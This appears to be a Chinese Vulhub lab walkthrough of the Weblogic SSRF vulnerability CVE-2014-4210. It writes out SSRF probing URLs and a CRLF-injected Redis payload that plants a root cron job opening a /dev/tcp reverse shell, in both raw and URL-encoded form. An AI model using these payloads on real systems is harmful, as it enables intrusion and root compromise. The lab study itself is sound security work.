# \[Vulhub\] Weblogic SSRF 漏洞（CVE-2014-4210）

## 漏洞复现
环境搭建完成后，访问http://your-ip:7001/uddiexplorer/，无需登录查看 uddiexplorer 应用。

01 探测存活IP

SSRF 漏洞存在于http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，构造payload:
```
http://10.11.45.150:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://10.11.35.243
```
若 IP 不存在则为如下情况：

## 探测开放端口

通过错误的不同，可暴破出内网 IP 开放的端口。

## 注入HTTP头，利用Redis反弹shell
Weblogic 的 SSRF 有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，
而某些服务（如 redis）是通过换行符来分隔每条命令，也就说我们可以通过该 SSRF 攻击内网中的 redis 服务器。

首先，通过 ssrf 探测内网中的 redis 服务器，应为这个漏洞是用 docker 环境搭建的，所以 redis 服务器的内网即是
docker 的网段（docker 环境的网段一般是 172.*）：
利用 SSRF 探测内网 redis 是否开放
发送三条重新分发命令，将 shell 脚本写入/etc/crontab，利用计划任务反弹shell：
```
set 1 "\n\n\n\n* * * * * root bash -c 'sh -i >& /dev/tcp/10.11.34.231/4444 0>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```
转换成URL编码，注意，换行符是“\r\n”，也就是“%0D%0A”。：
`test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.34.231%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
`
将 url 编码后的字符串触发 SSRF 的域名，发送：
```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.18.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.34.231%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1
Host: 10.11.45.150:7001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=BKRkg3JY7T2cpNLFtLNPD3DJvMy1TRrmXBFnYKzJk6tXvnsY7vJS!1942797293
Upgrade-Insecure-Requests: 1
```

成功反弹：

补充一下，可进行利用的cron有以下几个地方：

/etc/crontab 这个是肯定的
/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也和/etc/crontab相同。 。
/var/spool/cron/root centos系统下root用户的cron文件
/var/spool/cron/crontabs/root debian系统下root用户的cron文件
